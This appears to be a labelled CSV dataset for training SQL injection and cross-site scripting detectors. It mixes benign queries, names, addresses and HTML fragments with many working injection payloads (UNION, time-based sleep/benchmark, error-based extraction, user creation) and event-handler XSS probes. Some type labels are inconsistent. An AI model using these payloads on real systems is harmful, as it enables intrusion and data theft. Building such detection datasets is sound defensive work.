Text,Label,type
"<style>@keyframes slidein {}</style><col style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></col>",2,xss
16c64si30,0,sql
<shadow onpointerover=alert(1)>XSS</shadow>,2,xss
1'+  (  select 'rsgi' where 2258  =  2258,1,sql
martens@ajuntamentbarcelona2-0.tl,0,sql
SELECT * FROM spread ORDER BY say,0,sql
SELECT * FROM told FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
SELECT * FROM ate,0,sql
"1' union all select null,null,null,null,null,null,null,null--",1,xss
</div>,0,xss
"waitfor delay '0:0:5' and    (    (     (  ""lpeo""  =  ""lpeo",1,sql
raixa s/n,0,sql
6.29894E+15,0,sql
SELECT * FROM potatoes WHERE older BETWEEN '1996-07-01' AND '1996-07-31',0,sql
"<pre oncontextmenu=""alert(1)"">test</pre>",2,xss
"1%' union all select null,null,null,null,null#",1,sql
"-1212%'  )   or make_set  (  7588  =  2306,2306  )   and   (  '%'  =  '",1,sql
"<style>@keyframes x{}</style><caption style=""animation-name:x"" onanimationstart=""alert(1)""></caption>",2,xss
grueneic,0,xss
SELECT column_name ( s )  FROM table_name,0,xss
"1'  )   and elt  (  4249  =  4249,7259  )   and   (  'ifca' like 'ifca",1,sql
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and ""ulfr"" like ""ulfr",1,xss
"<div draggable=""true"" contenteditable>drag me</div><hr ondragover=alert(1) contenteditable>drop here</hr>",2,xss
SELECT * FROM graph WHERE tower = 'actual'  AND  ( gas = 'these' OR yard = 'eat' ) ,0,sql
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  --,1,sql
	 </span>,0,xss
<nobr onfocusout=alert(1) tabindex=1 id=x></nobr><input autofocus>,2,xss
"<tr oncontextmenu=""alert(1)"">test</tr>",2,xss
AI applications widely used behind the scenes:,0,xss
"<embed onmouseup=""alert(1)"">test</embed>",2,xss
SELECT quietly FROM where UNION ALL SELECT short FROM went ORDER BY caught,0,sql
"1""   )    )    and 2006  =  2006",1,sql
"calle la corta, 85",0,sql
<small onfocusout=alert(1) tabindex=1 id=x></small><input autofocus>,2,xss
SELECT COUNT ( write ) FROM poet,0,sql
"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",1,xss
SELECT * FROM being FETCH FIRST 3 ROWS ONLY,0,sql
SELECT shelf ( s )  FROM none UNION ALL,0,sql
if  (  7899  =  7899  )   select 7899 else drop function zbbp--,1,sql
"<style>:target {transform: rotate(180deg);}</style><span id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></span>",2,xss
SELECT AVG ( Price ) FROM skill,0,sql
"1   )    )    as wezj where 2869  =  2869 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,sql
1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'fdbm' like 'fdbm,1,sql
"<element draggable=""true"" ondrag=""alert(1)"">test</element>",2,xss
"1"" and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
"<svg oncut=""alert(1)"" contenteditable>test</svg>",2,xss
<image onpointermove=alert(1)>XSS</image>,2,xss
<object onfocusout=alert(1) tabindex=1 id=x></object><input autofocus>,2,xss
SELECT north ( s )  FROM team UNION,0,sql
<option id=x tabindex=1 ondeactivate=alert(1)></option><input id=y autofocus>,2,xss
SELECT * FROM tall  WHERE hung = brief,0,sql
5106,0,xss
"1   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   8965  =  8965",1,sql
<thead id=x tabindex=1 onbeforedeactivate=alert(1)></thead><input autofocus>,2,xss
"<strong oncontextmenu=""alert(1)"">test</strong>",2,xss
"<li onpaste=""alert(1)"" contenteditable>test</li>",2,xss
SELECT * FROM only WHERE    NOT acres = 'whale',0,sql
cary-whitten@magritte.pe,0,sql
"  UPDATE partly SET safety =  'shape', City =  'raise' WHERE throughout =  same",0,sql
-4215  )   where 5782  =  5782 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,sql
SELECT TOP 3 * FROM lips WHERE walk = 'fence',0,sql
SELECT TOP 3 * FROM fed SELECT * FROM line 3SELECT * FROM verb,0,sql
ejarque barbieri,0,sql
milly7,0,sql
"<style>@keyframes x{}</style><tt style=""animation-name:x"" onanimationend=""alert(1)""></tt>",2,xss
<frameset onpointerenter=alert(1)>XSS</frameset>,2,xss
document.write,2,xss
<object onpointerover=alert(1)>XSS</object>,2,xss
arganza,0,sql
select   (  case when   (  1123  =  9550  )   then 1123 else 1123*  (  select 1123 from information_schema.character_sets  )   end  )  #,1,sql
6.1724E+15,0,xss
"   SELECT joined, boat+ ', ' + its+ ' ' + label+ ', ' + broken AS club  FROM joy",0,sql
SELECT * FROM cup 3 SELECT * FROM jungle,0,sql
SELECT COUNT ( improve )  FROM control,0,sql
"-6084""   )    )    union all select 7354,7354,7354,7354,7354,7354,7354,7354#",1,sql
"  SELECT Orders.OrderID, Customers.CustomerName, Orders.OrderDateFROM OrdersINNER JOIN Customers ON Orders.CustomerID = Customers.CustomerID;",0,sql
"1""   )    )     )   and   (  7758  =  4628  )  *4628 and    (    (     (  ""wzas""  =  ""wzas",1,sql
5631,0,sql
<mark onpointerenter=alert(1)>XSS</mark>,2,xss
"1'+  (  select sfuq where 8094  =  8094 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   +'",1,sql
SELECT * FROM service ORDER BY connected,0,sql
SELECT * FROM  ( SELECT prove FROM individual ) ,0,sql
"   SELECT decide, cattle, daughter FROM ants WHERE organization  IS NULL",0,sql
SELECT * FROM pretty,0,sql
"<style>:target {color:red;}</style><legend id=x style=""transition:color 1s"" ontransitionend=alert(1)></legend>",2,xss
"<body onhashchange=""alert(1)"">",2,xss
DELETE FROM basket WHERE increase = 'cotton',0,sql
"	 </span>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20070810233856/http://www-formal.stanford.edu/jmc/mcchay69.html"">Archived </a> from the original on 10 August 2007<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">30 August ",0,xss
"  SELECT strong,molecular FROM coat WHERE coach = 'industrial' UNION SELECT frighten, moving FROM usual",0,sql
"<kbd onkeydown=""alert(1)"" contenteditable>test</kbd>",2,xss
"1 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- yekf",1,sql
"<style>:target {color: red;}</style><output id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></output>",2,xss
SELECT loss ( s )  FROM sale UNION ALL,0,xss
SELECT MIN ( manner )  AS harder FROM base,0,sql
"	<sup id=""cite_ref-FOOTNOTEEdelson1991_141-0"" class=""reference"">",0,xss
"<style>@keyframes slidein {}</style><samp style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></samp>",2,xss
"<meter onmouseover=""alert(1)"">test</meter>",2,xss
"1,  (  select   (  case when   (  8392  =  8404  )   then 1 else 8392*  (  select 8392 from information_schema.character_sets  )   end   )    )   ",1,xss
 </li>,0,xss
49830,0,sql
6703,0,sql
"   SELECT COUNT ( negative ) , attack FROM night BY lonely",0,sql
document.documentURI,2,xss
SELECT * FROM habit,0,xss
<basefont onpointerup=alert(1)>XSS</basefont>,2,xss
"aljaraque 196, 11d",0,sql
SELECT * FROM arm WHERE tongue = 'divide' FETCH FIRST 3 ROWS ONLY,0,sql
"1'   )    )    as atpy where 9020  =  9020 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
select   (  case when   (  6839  =  2730  )   then 6839 else 6839*  (  select 6839 from mysql.db  )   end  )  #,1,sql
"	 </span> <span class=""reference-text""><cite class=""citation news"">Rawlinson, Kevin (29 January 2015). <a rel=""nofollow"" class=""external text"" href=""https://www.bbc.co.uk/news/31047780"">""Microsoft's Bill Gates insists AI is a threat"" </a>. <i>BBC News </i>. <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20150129183607/http://www.bbc.co.uk/news/31047780"">Archived </a> from the original on 29 January 2015<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">30 January ",0,xss
"<dl class=""docutils"">",0,xss
"1""   )    )    or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,xss
<img onpointerenter=alert(1)>XSS</img>,2,xss
"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'ekqv'  =  'ekqv",1,sql
9.00454E+15,0,sql
create user name identified by 'pass123',1,sql
"<span oncut=""alert(1)"" contenteditable>test</span>",2,xss
"<li><a href=""#CITEREFPooleMackworthGoebel1998"">Poole, Mackworth &amp; Goebel 1998 </a>, chpt. 2,3,7,9, </li>",0,xss
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=Infosys&amp;rft.atitle=Role+of+AI+in+travel+and+Hospitality+Industry&amp;rft.date=2018&amp;rft_id=https%3A%2F%2Fwww.infosys.com%2Findustries%2Ftravel-hospitality%2Fdocuments%2Fai-travel-hospitality.pdf&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"<multicol ondblclick=""alert(1)"">test</multicol>",2,xss
"1""  )   as lrew where 6067  =  6067 union all select null,null,null,null,null,null,null#",1,sql
"1 where 5627  =  5627 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,xss
7.33372E+15,0,sql
"<tt onclick=""alert(1)"">test</tt>",2,xss
1' where 5060  =  5060,1,sql
 </li>,0,xss
"1'  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  'medg'  =  'medg",1,sql
"1%'  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  '%'  =  '",1,sql
"	 </span><span style=""display: inline-block; margin-left: 4px; width: 182px; vertical-align: middle;""><a href=""https://commons.wikimedia.org/wiki/Category:Artificial_intelligence"" class=""extiw"" title=""c:Category:Artificial intelligence"">Media </a> from Wikimedia Commons ",0,xss
<embed onblur=alert(1) tabindex=1 id=x></embed><input autofocus>,2,xss
"1"" order by 1#",1,sql
"<col onpaste=""alert(1)"" contenteditable>test</col>",2,xss
10970,0,xss
SELECT * FROM repeat WHERE observe BETWEEN 'exact' AND 'boat',0,sql
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><script id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></script>",2,xss
"<acronym ondblclick=""alert(1)"">test</acronym>",2,xss
"<time onmousedown=""alert(1)"">test</time>",2,xss
12,0,sql
"  UPDATE everywhere SET volume =  'moment', City =  'place' WHERE several =  labor",0,sql
SELECT DISTINCT cannot FROM feature,0,sql
"INSERT INTO little  ( air, slowly, movie )  VALUES  ( 'pressure', 'search', 'classroom' )  ",0,sql
"do cotaredo, 147 9e",0,sql
top[‘al\x65rt’](1),2,xss
SELECT MIN ( enjoy )  AS truth FROM would,0,sql
"-5513""   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""ovmk"" like ""ovmk",1,sql
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  9847  =  9847",1,sql
	 </span> </a> </li>,0,xss
incrdu69,0,sql
monzon pinart,0,xss
"1""   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""umne"" like ""umne",1,sql
"-8966""   )    )     )   or 1628  =  2712",1,sql
jia,0,xss
"<b onbeforecut=""alert(1)"" contenteditable>test</b>",2,xss
"1'||  (  select 'vqag' from dual where 8154  =  8154 union all select null,null,null,null,null,null,null,null,null,null--",1,xss
SELECT * FROM beginning ORDER BY flight DESC,0,sql
" select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1",1,xss
"<li><a href=""/wiki/McCarthy_Formalism"" title=""McCarthy Formalism"">McCarthy Formalism </a> </li>",0,xss
"<rt onkeydown=""alert(1)"" contenteditable>test</rt>",2,xss
"1'  )   as ywtu where 3009  =  3009 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,sql
"1""   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   ""hhwy""  =  ""hhwy",1,xss
"<h1 onmouseleave=""alert(1)"">test</h1>",2,xss
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'tmdj' like 'tmdj",1,sql
"<isindex onbeforecut=""alert(1)"" contenteditable>test</isindex>",2,xss
	 </span> ,0,xss
SELECT DISTINCT cage FROM relationship,0,sql
SELECT * FROM across,0,sql
"  SELECT * FROM double WHERE plane NOT IN  ( 'what', 'thus', 'travel' )  ",0,sql
7092,0,sql
SELECT road ( s )  FROM middle SELECT rice FROM broke,0,sql
"	 </span> <span class=""toctext"">Art ",0,xss
tenna1,0,sql
"<li><a href=""/wiki/Evolutionary_algorithm"" title=""Evolutionary algorithm"">Evolutionary algorithm </a> </li>",0,xss
"        <script src=""_static/language_data.js""></script>",0,xss
"1""  )   union all select null,null,null,null,null#",1,sql
1' and 9970  =  3409,1,sql
"-4934"" union all select 5119,5119,5119,5119,5119--",1,sql
"1""  )   as hfvz where 7186  =  7186 union all select null,null,null,null,null,null#",1,sql
"1"" where 4597  =  4597 rlike sleep  (  5  )  --",1,sql
"<li><a href=""/wiki/Reinforcement_learning"" title=""Reinforcement learning"">Reinforcement learning </a> </li>",0,xss
muduex,0,sql
urea bernat,0,sql
SELECT * FROM recent FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM settlers,0,sql
<rb onpointerleave=alert(1)>XSS</rb>,2,xss
"<acronym draggable=""true"" ondragleave=""alert(1)"">test</acronym>",2,xss
"   SELECT Employees.accident, COUNT ( Orders.rhythmID )  AS meantFROM    ( OrdersINNER JOIN division ON Orders.stripID  =  Employees.takenID ) ",0,sql
"<tr draggable=""true"" ondragstart=""alert(1)"">test</tr>",2,xss
jamaly,0,xss
edlene,0,xss
SELECT * FROM hair WHERE Price NOT BETWEEN 10 AND 20,0,sql
SELECT MIN ( report )  AS man FROM provide,0,xss
SELECT * FROM repeat WHERE game = 'field' LIMIT 3,0,xss
"1'   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   'jnmf'  =  'jnmf",1,sql
saviange_files@zytel.nc,0,sql
"<style>@keyframes slidein {}</style><font style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></font>",2,xss
c/ hermanos pinzon 178,0,sql
"<li><a href=""/wiki/Positivism"" title=""Positivism"">Positivism </a>&#160;/&#32;<a href=""/wiki/Reductionism"" title=""Reductionism"">Reductionism </a>&#160;/&#32;<a href=""/wiki/Determinism"" title=""Determinism"">Determinism </a> </li>",0,xss
espls,0,sql
1'+  (  select 'zgtu' where 8419  =  8419,1,sql
1   )    )    or sleep  (  __TIME__  )  #,1,xss
"   SELECT COUNT ( positive ) , sentence FROM ahead BY sometime",0,sql
"-3037""   )    )     )   or elt  (  4758  =  9129,9129  )   and    (    (     (  ""zewv"" like ""zewv",1,sql
brenna,0,sql
"<select onclick=""alert(1)"">test</select>",2,xss
ribera d'ondara,0,sql
"<ul><li><a href=""#CITEREFRussellNorvig2003"">Russell &amp; Norvig 2003 </a>, p.&#160;758 </li>",0,xss
"  SELECT   CAST ( ""2017-08-29"" AS DATE ) ;",0,sql
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 365884 )  ORDER BY meta_id ASC",0,sql
	 </span>,0,xss
"  SELECT * FROM mark WHERE citizen IN  ( 'strip', 'prepare', 'pencil' )  ",0,sql
e0u08os1,0,sql
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  ""jzmg""  =  ""jzmg",1,sql
"INSERT INTO life  ( base, complex, wore )  VALUES  ( 'silk', 'success', 'diameter' )  ",0,sql
"<style>:target {transform: rotate(180deg);}</style><svg id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></svg>",2,xss
<section onpointerout=alert(1)>XSS</section>,2,xss
"<li><a href=""/wiki/General-purpose_computing_on_graphics_processing_units"" title=""General-purpose computing on graphics processing units"">GPGPU </a> </li>",0,xss
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 7515 )  ORDER BY meta_id ASC",0,xss
"1""   )    )    as gqxk where 9199  =  9199 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",1,sql
"1""   )    )    as jmoy where 9676  =  9676 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
{s,1,sql
"<dfn onpaste=""alert(1)"" contenteditable>test</dfn>",2,xss
"<ul><li><a href=""/wiki/Metaphysics"" title=""Metaphysics"">Metaphysics </a> </li>",0,xss
"1"" where 6200  =  6200 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1,xss
" SELECT * FROM gravity ORDER BY arrive, strange",0,sql
 UPDATE moment SET sell = 'lay'WHERE trick = 'managed',0,sql
"1   )    )    as xvyi where 6701  =  6701 union all select null,null,null,null#",1,sql
59718568b,0,xss
"<s onmouseleave=""alert(1)"">test</s>",2,xss
"<hgroup onclick=""alert(1)"">test</hgroup>",2,xss
"<dl onmouseleave=""alert(1)"">test</dl>",2,xss
s3borrea,0,sql
1 where 8135  =  8135,1,sql
"1""  )   as rcnk where 1800  =  1800",1,sql
"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",1,xss
1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,sql
" SELECT * FROM afraid ORDER BY wonderful ASC, leaf DESC",0,sql
